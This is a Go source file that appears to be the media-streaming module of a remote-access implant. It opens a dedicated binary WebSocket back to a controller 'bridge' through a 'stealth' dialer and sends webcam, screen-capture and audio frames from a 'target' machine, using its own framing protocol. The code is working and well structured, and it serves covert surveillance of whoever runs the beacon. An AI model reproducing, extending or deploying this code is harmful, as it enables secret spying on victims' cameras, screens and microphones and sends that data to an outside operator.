//go:build linux || darwin || windows

// media_ws.go — dedicated binary media plane.
//
// Media NEVER shares the JSON control WebSocket. Each stream session gets its
// own binary WebSocket, paired by the bridge exactly like the port-forward
// tunnel. Frames are raw bytes with a fixed 2-byte header — no base64, no
// JSON, no per-chunk mutex contention with heartbeats or command results.
//
// Wire format (all big-endian):
//
//	INIT   [0x01][stream:1][mimeLen:2][mime:utf8][width:4][height:4]
//	CHUNK  [0x02][stream:1][seq:4][payload:...]
//	ERROR  [0x03][stream:1][msgLen:2][msg:utf8]
//	EOS    [0x04][stream:1]
//
// stream: 0=webcam 1=screen 2=audio
package main

import (
	"context"
	"encoding/binary"
	"net/http"
	"strings"
	"sync"
	"time"


	"github.com/gorilla/websocket"
)

// Stream identifiers (byte 2 of every frame).
const (
	mediaStreamWebcam byte = 0x00
	mediaStreamScreen byte = 0x01
	mediaStreamAudio  byte = 0x02
)

// Frame kinds (byte 1 of every frame).
const (
	mediaKindInit  byte = 0x01
	mediaKindChunk byte = 0x02
	mediaKindError byte = 0x03
	mediaKindEOS   byte = 0x04
)

// mediaQueueSize bounds how many frames may be queued before we drop the
// oldest. Recency beats completeness for live media.
const mediaQueueSize = 24

// mediaDialTimeout / mediaRetries control the dial-back to the bridge.
const (
	mediaDialTimeout = 10 * time.Second
	mediaDialRetries = 6
)

type mediaPlane struct {
	sessionID string
	queue     chan []byte
	writeMu   sync.Mutex
	conn      *websocket.Conn
	cancel    context.CancelFunc
	ready     chan struct{}
}

var (
	mediaPlaneMu sync.Mutex
	mediaPlanes  = map[string]*mediaPlane{}
)

// mediaPlaneFor returns (creating if needed) the media plane for a session.
// Idempotent — repeated calls for the same session return the same plane.
func mediaPlaneFor(sessionID string) *mediaPlane {
	mediaPlaneMu.Lock()
	defer mediaPlaneMu.Unlock()
	if p, ok := mediaPlanes[sessionID]; ok {
		return p
	}
	ctx, cancel := context.WithCancel(context.Background())
	p := &mediaPlane{
		sessionID: sessionID,
		queue:     make(chan []byte, mediaQueueSize),
		cancel:    cancel,
		ready:     make(chan struct{}),
	}
	mediaPlanes[sessionID] = p
	go p.run(ctx)
	go p.writer(ctx)
	return p
}

// mediaPlaneClose tears down a session's media plane and frees its slot.
func mediaPlaneClose(sessionID string) {
	mediaPlaneMu.Lock()
	p := mediaPlanes[sessionID]
	delete(mediaPlanes, sessionID)
	mediaPlaneMu.Unlock()
	if p == nil {
		return
	}
	p.cancel()
	p.writeMu.Lock()
	if p.conn != nil {
		_ = p.conn.Close()
	}
	p.writeMu.Unlock()
}

// closeAllMediaPlanes is called on beacon shutdown.
func closeAllMediaPlanes() {
	mediaPlaneMu.Lock()
	ids := make([]string, 0, len(mediaPlanes))
	for id := range mediaPlanes {
		ids = append(ids, id)
	}
	mediaPlaneMu.Unlock()
	for _, id := range ids {
		mediaPlaneClose(id)
	}
}

func (p *mediaPlane) run(ctx context.Context) {
	wsURL := buildMediaURL(p.sessionID)
	dialer := newStealthDialer(mediaDialTimeout)

	var conn *websocket.Conn
	for attempt := 0; attempt < mediaDialRetries; attempt++ {
		select {
		case <-ctx.Done():
			return
		default:
		}
		var resp *http.Response
		var err error
		conn, resp, err = dialer.DialContext(ctx, wsURL, http.Header{})
		if resp != nil && resp.Body != nil {
			_ = resp.Body.Close()
		}
		if err == nil {
			break
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(time.Duration(attempt+1) * 400 * time.Millisecond):
		}
	}

	if conn == nil {
		debugLog.Printf("%s media ws dial failed session=%s", logPrefix, p.sessionID)
		close(p.ready)
		return
	}

	p.writeMu.Lock()
	p.conn = conn
	p.writeMu.Unlock()
	close(p.ready)

	// The dashboard side never sends media upstream, but we must keep reading
	// to process ping/pong and to notice when the bridge drops us.
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		if _, _, err := conn.ReadMessage(); err != nil {
			return
		}
	}
}

// writer drains the queue. It never blocks the capture goroutine.
func (p *mediaPlane) writer(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case frame := <-p.queue:
			p.writeMu.Lock()
			conn := p.conn
			p.writeMu.Unlock()
			if conn == nil {
				// Not connected yet — drop. Init frames are re-queued by the
				// stream on connect in practice; chunks are safe to lose.
				continue
			}
			_ = conn.SetWriteDeadline(time.Now().Add(8 * time.Second))
			if err := conn.WriteMessage(websocket.BinaryMessage, frame); err != nil {
				continue
			}
		}
	}
}

// enqueue adds a frame, evicting the oldest when full so a slow link can
// never grow the backlog without bound.
func (p *mediaPlane) enqueue(frame []byte, control bool) {
	select {
	case p.queue <- frame:
		return
	default:
	}
	// Full — evict the oldest frame to make room. Control frames are rare and
	// always win: we make space for them rather than dropping them.
	select {
	case <-p.queue:
	default:
	}
	select {
	case p.queue <- frame:
	default:
	}
	_ = control
}

func (p *mediaPlane) sendInit(streamID byte, mime string, w, h int) {
	mimeB := []byte(mime)
	buf := make([]byte, 0, 8+len(mimeB))
	buf = append(buf, mediaKindInit, streamID)
	var l [2]byte
	binary.BigEndian.PutUint16(l[:], uint16(len(mimeB)))
	buf = append(buf, l[:]...)
	buf = append(buf, mimeB...)
	var dim [8]byte
	binary.BigEndian.PutUint32(dim[0:4], uint32(w))
	binary.BigEndian.PutUint32(dim[4:8], uint32(h))
	buf = append(buf, dim[:]...)
	p.enqueue(buf, true)
}

func (p *mediaPlane) sendChunk(streamID byte, seq int, payload []byte) {
	buf := make([]byte, 6+len(payload))
	buf[0] = mediaKindChunk
	buf[1] = streamID
	binary.BigEndian.PutUint32(buf[2:6], uint32(seq))
	copy(buf[6:], payload)
	p.enqueue(buf, false)
}

func (p *mediaPlane) sendError(streamID byte, msg string) {
	mb := []byte(msg)
	buf := make([]byte, 0, 4+len(mb))
	buf = append(buf, mediaKindError, streamID)
	var l [2]byte
	binary.BigEndian.PutUint16(l[:], uint16(len(mb)))
	buf = append(buf, l[:]...)
	buf = append(buf, mb...)
	p.enqueue(buf, true)
}

func (p *mediaPlane) sendEOS(streamID byte) {
	p.enqueue([]byte{mediaKindEOS, streamID}, true)
}

// buildMediaURL converts the bridge URL into the media WebSocket URL.
func buildMediaURL(sessionID string) string {
	base := bridgeURL
	if strings.HasPrefix(base, "https://") {
		base = "wss://" + strings.TrimPrefix(base, "https://")
	} else if strings.HasPrefix(base, "http://") {
		base = "ws://" + strings.TrimPrefix(base, "http://")
	}
	base = strings.TrimRight(base, "/")
	return base + "/ws/media/" + targetID + "/" + sessionID + "?role=" + "beacon"
}
